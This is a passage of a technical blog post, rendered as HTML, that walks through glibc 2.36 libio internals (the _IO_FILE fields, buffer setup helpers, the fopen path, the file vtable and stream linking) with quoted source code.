  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)];</span>
<span class="p">};</span>
</code></pre></div><p>Before starting to describe each field of the structure, you have to understand that according to behaviour of the function that uses a file stream, only a small part of the <code>_IO_FILE</code> structure is used. For example if the file stream is byte oriented, <code>_IO_wide_data</code> related operations are not used.</p>
<p>Let&rsquo;s review the fields of the structure:</p>
<ul>
<li><code>_flags</code>: High-order word is <code>_IO_MAGIC</code>, rest is flags.</li>
<li><code>_IO_read_ptr</code> address of input within the input buffer that has been already used.</li>
<li><code>_IO_read_end</code> end address of the input buffer.</li>
<li><code>_IO_read_base</code> base address of the input buffer.</li>
<li><code>_IO_write_base</code> base address of the ouput buffer.</li>
<li><code>_IO_write_ptr</code> points to the character that hasn’t been printed yet.</li>
<li><code>_IO_write_end</code> end address of the output buffer.</li>
<li><code>_IO_buf_base</code> base address for both input and output buffer.</li>
<li><code>_IO_buf_end</code> end address for both input and output buffer.</li>
<li><code>_chain</code> stands for the single linked list that links of all file streams.</li>
<li><code>_fileno</code> stands for the file descriptor associated to the file.</li>
<li><code>_vtable_offset</code> stands for the offset of the vtable we have to use.</li>
<li><code>_offset</code> stands for the current offset within the file.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h1 id="common-functions">
        Common functions
        <a data-clipboard-text="https://nasm.re/posts/filestream/#common-functions" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Common functions" href="#common-functions">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<ul>
<li><code>_IO_setb (FILE *f, char *base, char *end, int do_user_buf)</code>: Initializes the base buffer. Here is its implementation:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L328
</span><span class="c1"></span>
<span class="kt">void</span>
<span class="nf">_IO_setb</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">eb</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_USER_BUF</span><span class="p">))</span>
    <span class="n">free</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="n">b</span><span class="p">;</span>
  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="n">eb</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_USER_BUF</span><span class="p">;</span>
  <span class="k">else</span>
    <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_USER_BUF</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_setb</span><span class="p">)</span>
</code></pre></div><p><code>_IO_USER_BUF</code>: Don&rsquo;t deallocate buffer on close.</p>
<ul>
<li><code>_IO_setg(fp, base, current, end)</code>: Initializes read pointers. Here is its code:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libioP.h#L520
</span><span class="c1"></span>
<span class="cp">#define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\
</span><span class="cp">	(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))
</span></code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="fopen">
        fopen
        <a data-clipboard-text="https://nasm.re/posts/filestream/#fopen" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor fopen" href="#fopen">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>Let&rsquo;s review the opening process of a file and how the <code>_IO_FILE</code> structure is intitialized. <code>fopen</code> is implemented in <code>libio/iofopen.c</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/iofopen.c#L83
</span><span class="c1"></span><span class="n">FILE</span> <span class="o">*</span>
<span class="nf">_IO_new_fopen</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">__fopen_internal</span> <span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">strong_alias</span> <span class="p">(</span><span class="n">_IO_new_fopen</span><span class="p">,</span> <span class="n">__new_fopen</span><span class="p">)</span>
<span class="n">versioned_symbol</span> <span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">_IO_new_fopen</span><span class="p">,</span> <span class="n">_IO_fopen</span><span class="p">,</span> <span class="n">GLIBC_2_1</span><span class="p">);</span>
<span class="n">versioned_symbol</span> <span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">__new_fopen</span><span class="p">,</span> <span class="n">fopen</span><span class="p">,</span> <span class="n">GLIBC_2_1</span><span class="p">);</span>

<span class="cp"># if !defined O_LARGEFILE || O_LARGEFILE == 0
</span><span class="cp"></span><span class="n">weak_alias</span> <span class="p">(</span><span class="n">_IO_new_fopen</span><span class="p">,</span> <span class="n">_IO_fopen64</span><span class="p">)</span>
<span class="n">weak_alias</span> <span class="p">(</span><span class="n">_IO_new_fopen</span><span class="p">,</span> <span class="n">fopen64</span><span class="p">)</span>
<span class="cp"># endif
</span></code></pre></div><p>Then it calls <code>__fopen_internal</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/iofopen.c#L56
</span><span class="c1"></span><span class="n">FILE</span> <span class="o">*</span>
<span class="nf">__fopen_internal</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">,</span> <span class="kt">int</span> <span class="n">is32</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">locked_FILE</span>
  <span class="p">{</span>
    <span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="n">fp</span><span class="p">;</span>
<span class="cp">#ifdef _IO_MTSAFE_IO
</span><span class="cp"></span>    <span class="n">_IO_lock_t</span> <span class="n">lock</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp"></span>    <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="n">wd</span><span class="p">;</span>
  <span class="p">}</span> <span class="o">*</span><span class="n">new_f</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">locked_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">locked_FILE</span><span class="p">));</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">new_f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="cp">#ifdef _IO_MTSAFE_IO
</span><span class="cp"></span>  <span class="n">new_f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">.</span><span class="n">file</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp"></span>  <span class="n">_IO_no_init</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">.</span><span class="n">file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">wd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps</span><span class="p">);</span>
  <span class="n">_IO_JUMPS</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps</span><span class="p">;</span>
  <span class="n">_IO_new_file_init_internal</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_file_fopen</span> <span class="p">((</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">new_f</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">is32</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">__fopen_maybe_mmap</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">.</span><span class="n">file</span><span class="p">);</span>

  <span class="n">_IO_un_link</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">new_f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">);</span>
  <span class="n">free</span> <span class="p">(</span><span class="n">new_f</span><span class="p">);</span>
  <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>First, a <code>struct locked_FILE</code> is allocated on the heap. <code>_IO_no_init</code> &ndash; and <code>_IO_old_init</code> within it &ndash; null out the structure:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L561
</span><span class="c1"></span><span class="kt">void</span>
<span class="nf">_IO_no_init</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">int</span> <span class="n">orientation</span><span class="p">,</span>
	     <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">wd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">jmp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">_IO_old_init</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">=</span> <span class="n">orientation</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">orientation</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">wd</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_save_end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">=</span> <span class="n">jmp</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">else</span>
    <span class="cm">/* Cause predictable crash when a wide function is called on a byte
</span><span class="cm">       stream.  */</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span><span class="mi">1L</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_freeres_list</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L530
</span><span class="c1"></span>
<span class="kt">void</span>
<span class="nf">_IO_old_init</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">=</span> <span class="n">_IO_MAGIC</span><span class="o">|</span><span class="n">flags</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stdio_needs_locking</span><span class="p">)</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags2</span> <span class="o">|=</span> <span class="n">_IO_FLAGS2_NEED_LOCK</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_chain</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="cm">/* Not necessary. */</span>

  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_markers</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="cp">#if _IO_JUMPS_OFFSET
</span><span class="cp"></span>  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_vtable_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp">#ifdef _IO_MTSAFE_IO
</span><span class="cp"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_lock</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="n">_IO_lock_init</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_lock</span><span class="p">);</span>
<span class="cp">#endif
</span><span class="cp"></span><span class="p">}</span>
</code></pre></div><p>Then it initializes the vtable field field to <code>&amp;_IO_file_jumps</code> initialized in <code>/source/libio/fileops.c#L1432</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// /source/libio/fileops.c#L1432
</span><span class="c1"></span>

<span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_file_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_file_finish</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_default_pbackfail</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_file_xsputn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_new_file_seekoff</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_new_file_setbuf</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_new_file_sync</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_file_doallocate</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
<span class="p">};</span>
<span class="n">libc_hidden_data_def</span> <span class="p">(</span><span class="n">_IO_file_jumps</span><span class="p">)</span>
</code></pre></div><p>Most of the intialization stuff stands in the <code>_IO_new_file_init_internal</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L105
</span><span class="c1"></span>
<span class="kt">void</span>
<span class="nf">_IO_new_file_init_internal</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* POSIX.1 allows another file handle to be used to change the position
</span><span class="cm">     of our file descriptor.  Hence we actually don&#39;t know the actual
</span><span class="cm">     position before we do the first fseek (and until a following fflush). */</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">.</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">.</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">CLOSED_FILEBUF_FLAGS</span><span class="p">;</span>

  <span class="n">_IO_link_in</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">.</span><span class="n">_fileno</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p><code>fp-&gt;file._flags</code> is initialized to <code>CLOSED_FILEBUF_FLAGS</code> which means according to its definition:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L100
</span><span class="c1"></span>
<span class="cp">#define CLOSED_FILEBUF_FLAGS \
</span><span class="cp">  (_IO_IS_FILEBUF+_IO_NO_READS+_IO_NO_WRITES+_IO_TIED_PUT_GET)
</span><span class="cp"></span>
<span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libio.h#L78
</span><span class="c1"></span><span class="cp">#define _IO_TIED_PUT_GET      0x0400 </span><span class="cm">/* Put and get pointer move in unison.  */</span><span class="cp">
</span></code></pre></div><p>Then the <code>fp</code> (the file pointer) is linked into the single linked list that keeps track of every file stream, for which the HEAD is <code>_IO_list_all</code>.
<code>_IO_link_in</code> is defined like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L86
</span><span class="c1"></span>
<span class="kt">void</span>
<span class="nf">_IO_link_in</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">.</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_LINKED</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">.</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_LINKED</span><span class="p">;</span>
<span class="cp">#ifdef _IO_MTSAFE_IO
</span><span class="cp"></span>      <span class="n">_IO_cleanup_region_start_noarg</span> <span class="p">(</span><span class="n">flush_cleanup</span><span class="p">);</span>
      <span class="n">_IO_lock_lock</span> <span class="p">(</span><span class="n">list_all_lock</span><span class="p">);</span>
      <span class="n">run_fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">;</span>
      <span class="n">_IO_flockfile</span> <span class="p">((</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">);</span>
<span class="cp">#endif
</span><span class="cp"></span>      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">.</span><span class="n">_chain</span> <span class="o">=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
      <span class="n">_IO_list_all</span> <span class="o">=</span> <span class="n">fp</span><span class="p">;</span>
<span class="cp">#ifdef _IO_MTSAFE_IO
</span><span class="cp"></span>      <span class="n">_IO_funlockfile</span> <span class="p">((</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">);</span>
      <span class="n">run_fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">_IO_lock_unlock</span> <span class="p">(</span><span class="n">list_all_lock</span><span class="p">);</span>
      <span class="n">_IO_cleanup_region_end</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="cp">#endif
</span><span class="cp"></span>    <span class="p">}</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_link_in</span><span class="p">)</span>
</code></pre></div><p>Once it has been initialized, <code>_IO_file_fopen</code> is called to open the file with the right file and mode. Here is its definition:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L211
</span><span class="c1"></span>
<span class="n">FILE</span> <span class="o">*</span>
<span class="nf">_IO_new_file_fopen</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">,</span>
		    <span class="kt">int</span> <span class="n">is32not64</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">oflags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">omode</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">read_write</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">oprot</span> <span class="o">=</span> <span class="mo">0666</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="n">FILE</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cs</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">last_recognized</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_file_is_open</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">switch</span> <span class="p">(</span><span class="o">*</span><span class="n">mode</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="sc">&#39;r&#39;</span><span class="o">:</span>
      <span class="n">omode</span> <span class="o">=</span> <span class="n">O_RDONLY</span><span class="p">;</span>
      <span class="n">read_write</span> <span class="o">=</span> <span class="n">_IO_NO_WRITES</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="sc">&#39;w&#39;</span><span class="o">:</span>
